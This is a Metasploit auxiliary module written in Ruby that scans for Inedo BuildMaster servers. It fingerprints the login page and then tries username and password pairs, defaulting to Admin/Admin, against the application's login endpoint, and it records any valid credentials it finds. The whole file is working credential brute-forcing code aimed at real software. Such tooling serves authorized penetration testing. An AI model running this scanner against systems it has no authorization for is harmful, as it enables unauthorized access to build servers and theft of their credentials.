##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Inedo BuildMaster Login Scanner',
      'Description' => %{
          This module will attempt to authenticate to BuildMaster. There is a default user 'Admin'
          which has the default password 'Admin'.
      },
      'Author'         => [ 'James Otten <jamesotten1[at]gmail.com>' ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => true })
    )

    register_options(
      [
        Opt::RPORT(81),
        OptString.new('USERNAME', [false, 'Username to authenticate as', 'Admin']),
        OptString.new('PASSWORD', [false, 'Password to authenticate with', 'Admin'])
      ]
    )
  end

  def run_host(ip)
    return unless buildmaster?

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def buildmaster?
    begin
      res = send_request_cgi('uri' => '/log-in')
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{peer} - HTTP Connection Failed")
      return false
    end

    if res && res.code == 200 && res.body.include?('BuildMaster_Version')
      version = res.body.scan(%r{<span id="BuildMaster_Version">(.*)</span>}).flatten.first
      print_good("#{peer} - Identified BuildMaster #{version}")
      return true
    else
      print_error("#{peer} - Application does not appear to be BuildMaster")
      return false
    end
  end

  def login_succeeded?(res)
    if res && res.code == 200
      body = JSON.parse(res.body)
      return body.key?('succeeded') && body['succeeded']
    end
    false
  rescue
    false
  end

  def do_login(user, pass)
    print_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
        {
          'uri' => '/0x44/BuildMaster.Web.WebApplication/Inedo.BuildMaster.Web.WebApplication.Pages.LogInPage/LogIn',
          'method' => 'POST',
          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
          'vars_post' =>
            {
              'userName' => user,
              'password' => pass
            }
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{peer} - HTTP Connection Failed...")
      return :abort
    end

    if login_succeeded?(res)
      print_good("SUCCESSFUL LOGIN - #{peer} - #{user.inspect}:#{pass.inspect}")
      store_valid_credential(user: user, private: pass)
    else
      print_error("FAILED LOGIN - #{peer} - #{user.inspect}:#{pass.inspect}")
    end
  end
end
